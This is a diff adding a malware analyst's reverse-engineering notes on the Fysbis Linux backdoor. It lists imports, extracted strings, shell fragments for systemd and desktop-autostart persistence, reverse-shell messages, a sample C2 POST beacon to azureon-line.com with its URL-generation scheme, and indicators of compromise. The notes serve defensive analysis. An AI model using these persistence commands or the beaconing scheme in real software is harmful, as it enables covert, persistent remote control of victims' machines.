@@ -1,0 +1,309 @@
+MD5:364ff454dcf00420cff13a57bcb78467
+
+Files: 364ff454dcf00420cff13a57bcb78467.i64 (main IDA DB)
+
+Name: Fysbis
+
+Imports:
+
+File/Dir manipulation:
+chdir
+read
+dup
+close
+fopen
+feof
+write
+closedir
+remove
+open
+readdir
+umask
+lseek
+fgets
+
+Network and process communication:
+pipe2
+close
+gethostbyname
+dup
+read
+socket
+send
+write
+connect
+recv
+popen
+
+Host interaction/reckon:
+setsid
+gettimeofday
+system
+time
+fork
+wait
+getgrgid
+getpwuid
+geteuid
+
+Load libs:
+dlerror
+dlclose
+dlopen
+dlsym
+
+Events, threads, stuff:
+signal
+sigwait
+pthread is referred
+sigemptyset
+
+Device interaction:
+ioctl
+
+########################################################################################################
+Strings:
+
+HTTP:
+azureon-line.com
+URL requests:
+watch/?
+search/?
+find/?
+results/?
+open/?
+search/?
+close/?
+text=
+from=
+ags=
+btnG=
+oprnd=
+utm=
+channel=
+text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept
+en-us,en;q=0.5
+Accept-Language
+gzip, deflate
+Accept-Encoding
+Mozilla/5.0 Gecko/20100101 Firefox/20.0
+User-Agent
+Host
+POST
+Content-Length
+no-cache
+Cache-Control
+HTTP/1.1
+\r\n\r\n
+
+SQLite:		
+CREATE TABLE IF NOT EXISTS 
+(id,binary);
+DELETE FROM 
+WHERE 
+.id = 
+INSERT INTO 
+VALUES(?, ?);
+SELECT 
+.binary FROM 
+.id = ?;
+(id,dword);
+.dword FROM 
+; INSERT INTO 
+VALUES(
+sqlite3_open
+sqlite3_free
+sqlite3_close
+sqlite3_exec
+sqlite3_prepare
+sqlite3_step
+sqlite3_finalize
+sqlite3_column_int
+sqlite3_bind_blob
+sqlite3_bind_int
+sqlite3_column_blob
+sqlite3_column_bytes
+My_BD
+
+
+Remote web interface:		
+width=25%>
+</font></td></tr>
+<tr><td><font color=blue size=4>
+<table><caption><font size=4 color=red>TABLE FIND FILES</font></caption>
+</table>
+<table><caption><font size=4 color=red>TABLE READ FILES</font></caption>
+<font size=4 color=red align=center>WRITE FILE IS NOT SUCCESS</font><br>
+<font size=4 color=red align=center>WRITE FILE IS SUCCESS</font><br>
+<table><caption><font size=4 color=red>TABLE DELETE FILES</font></caption>
+<table><caption><font size=4 color=red>TABLE EXECUTE FILES</font></caption>
+
+
+Commands, indicators, etc:
+/bin
+rsyncd
+synchronize and backup service
+dbus-inotifier
+system service d-bus notifier
+.config/dbus-notifier
+ 2>&1
+/proc/%d/cmdline
+mv -f '
+rm -f 
+sed -i '/exit 0/d' 
+sed -i '/
+systemctl disable 
+.service
+rm -f /usr/lib/systemd/system/
+echo '
+ &' >> 
+echo 'exit 0' >> 
+grep -r '
+' /usr/lib/systemd/*
+find 
+/ -name 
+mkdir /usr/lib/cva-ssys
+/usr/lib
+echo -e '[Unit]\nDescription= 
+\nAfter=syslog.target\n' >> /usr/lib/systemd/system/
+echo -e '[Service]\nExecStart=
+\nOOMScoreAdjust=-500\n' >> /usr/lib/systemd/system/
+echo -e '[Install]\nWantedBy=multi-user.target' >> /usr/lib/systemd/system/
+ln -s '/lib/systemd/system/
+.service' '/etc/systemd/system/multi-user.target.wants/
+.service'
+systemctl daemon-reload
+systemctl enable 
+.service -f
+echo $0
+nash
+ls /etc | egrep -e"fedora*|debian*|gentoo*|mandriva*|mandrake*|meego*|redhat*|lsb-*|sun-*|SUSE*|release"
+fedora
+redhat
+lsb-
+debian
+SUSE
+ps -e | grep -o 
+systemd
+find /etc/ -name rc.local -type f
+grep '
+rm -f ~/.config/autostart/
+.desktop
+find ~ -name 
+pgrep -l "gnome|kde|mate|cinnamon|lxde|xfce|jwm"
+gnome
+lxde
+xfce
+' ~/.config/autostart/*
+printenv HOME
+mkdir ~/
+find ~/.config/ -name autostart
+mkdir ~/.config/autostart
+echo '[Desktop Entry]\nType=Application' >> ~/.config/autostart/
+echo 'Exec=
+echo 'Name[en_EN]=
+echo 'Name=
+echo 'Comment[en_EN]=\nComment=' >> ~/.config/autostart/
+if [ -d 
+/.local/cva-ssys ]; then echo -n "OK"; fi
+/.local/cva-ssys
+mkdir 
+/.local
+prms
+/libsqlite3
+/bin/sh
+exit	
+
+Reverse shell messages:
+Your command not writed to pipe
+Success execute command or long for waiting executing your command
+Terminal started
+Terminal don`t started
+Terminal stopped
+Terminal don`t stopped
+Terminal yet started
+Terminal yet stopped
+Incorrect command ID
+Error for command ID
+Terminal don`t started for executing command
+Command will have end with \n
+
+
+
+########################################################################################################
+HTTP POST:
+POST /search/?ai=uZaLGqL54G96wXeJDj1wDI5da&from=zzAH12B7zDd&utm=oeusohJ&oprnd=d&CnuS_=xs6 HTTP/1.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/5.0 Gecko/20100101 FireFox/20.0
+Host: azureon-line.com
+Content-Length: 69
+Cache-Control: no-cache
+
+9QUhpd7Vy0a_v_m2MUKQh_JxQl_HbZs5PSJkyVhK7P-MODRuTVRh4StYRv45TSNFIOw==
+
+How are the URLs generated:
+POST:
+[watch/? | search/? | results/? | open/? | search/? | close/?]/?
+
+followed by one or more of the following pairs:
+
+[text|ai|ags|oe|aq|btnG|oprnd|ai|utm|channel]=[RANDOM_STRING]& 
+
+the number of pairs is random (e.g. using _srand, time).
+
+If ai=[RANDOM_VALUE] is present on the aforementioned pairs, the following sequence is added:
+
+[RANDOMLY_GENERATED_STRING]=[RANDOMLY_GENERATED_STRING]
+
+Otherwise, "ai" is the last thing present on the URL.
+
+Some valid examples:
+results/?ai=cfZ9fGQQ5YG8KHJnyNR14ki0b&LgIBd=mT (ai was generated so it ends with random=random)
+
+results/?ai=sVPcCiv_iQfzxx7hhzsZZAdbA&oe=-RnOW5b&btnG=QjGpWn&6736=MT272rGU (ai was generated so it ends with random=random)
+
+The POST data seems to obey the following structure: [RANDOM_STRING][BASE64(RANDOM_SEQUENCE_OF_BYTES)]
+
+The GET beaconign function uses the same mechanisms to generate the resource URL. The domain is also the same.
+
+The domain is always the same.
+
+########################################################################################################
+
+Persistence:
+- If root: binary called rsyncd. Persistence mechanisms include /usr/lib/systemd or /etc/rc.local. Directory created /usr/lib/cva-ssys. If the malware fails to persist itself using rsyncd, it uses dbus-inotifier.
+- If not root: uses dbus-notifier process. The process is persisted using [HOME]/.config/autostart and the binary saved on [HOME]/.config/dbus-notifier/dbus-notifier. Then a directory [HOME]/.local/cva-ssys is created.
+
+########################################################################################################
+Features:
+- File write/download, read, execution and deletion.
+- Reverse shell
+- File listing. The output for this is presented in HTML.
+- Uses SQLite database (My_DB) to store configurations and other stuff. The stored data has a checksum that is computed by the malware. Some of the tables are: chnnl
+- RC4 encryption and simple xor encoding used for stuff like received data or data stored on the database.
+- Checks processes for desktop environments: gnome, kde, mate, cinnamon, lxde, xfce, jwm.
+- Checks OS type based on the following strings on /etc files: fedora, debian, gentoo, mandriva, mandrake, meego, redhat, lsb, sun, SUSE, release.
+
+When executing this malware freely, these functions are never called. Perhaps, the execution is triggered when a successful response from the server is received.
+
+- If /bin/nash is the console running this application, the malware exits.
+
+########################################################################################################
+Network indicators: 
+- Domain: azureon-line.com
+- URL: check HTTP part
+
+Endpoint:
+- SQLite database: My_DB ([HOME]/.local/) with tables chnnl
+- Directory: cva-ssys either on [HOME]/.local or /usr/lib.
+- Binary: [HOME]/.config/dbus-notifier/dbus-inotifier, /bin/rsyncd 
+- Persistence stuff: /usr/lib/systemd/system/rsyncd.service
+
+########################################################################################################
+Questions to answer:
+-SQLite database structure (e.g. tables)
+-HTTP responses and binary protocol (e.g. checksums, structure of requests)
+-Understand where RC4 and B64 are used
